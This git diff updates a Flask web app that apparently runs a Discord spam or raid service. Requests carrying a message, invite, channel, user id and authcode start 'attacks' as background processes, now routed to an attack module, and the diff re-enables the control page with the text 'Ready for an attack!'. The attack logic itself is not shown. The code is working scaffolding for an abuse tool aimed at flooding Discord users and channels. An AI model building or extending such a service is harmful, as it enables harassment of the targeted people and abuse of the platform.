@@ -4,9 +4,9 @@ import signal
 import spammer
 import datetime
 import requests
+import attack
 
 from multiprocessing import Process
-
 from flask import Flask
 from flask import request
 from flask import render_template
@@ -33,7 +33,7 @@ def stopAttack(authcode):
 	return {'authcode': authcode, 'stopped': True}
 
 def sendAttack(message=None, invite=None, authcode=None, channel=None, uid=None):
-	process = Process(target=spammer.nonMain, args=[message, invite, channel, uid])
+	process = Process(target=attack.nonMain, args=[message, invite, channel, uid])
 	process.start()
 	pid = process.pid
 	runningAttacks[authcode] = pid
@@ -150,22 +150,8 @@ def start():
 
 @app.route('/')
 def discord():
-	return 'Downtime for a few days at most, super busy and I need to work on the whole project, people will be given time for this. Sorry.'
+	#return 'Downtime for a few days at most, super busy and I need to work on the whole project, people will be given time for this. Sorry.'
 	return render_template('new_index.html', log="Ready for an attack!")
 
 if __name__ == '__main__':
     app.run(host='127.0.0.1', port=8080)
-
-"""
-	if params['action'] and params['authcode']:
-		authorized = isAuthorized(params['authcode'])
-
-		if authorized:
-			if params['action'] == 'attack':
-				attack = sendAttack(message=params['message'], invite=params['invite'], authcode=params['authcode'])
-				return render_template('new_index.html', log=str(attack))
-
-			elif params['action'] == 'stop':
-				stop = stopAttack(params['authcode'])
-				return render_template('new_index.html', log=str(stop))
-"""
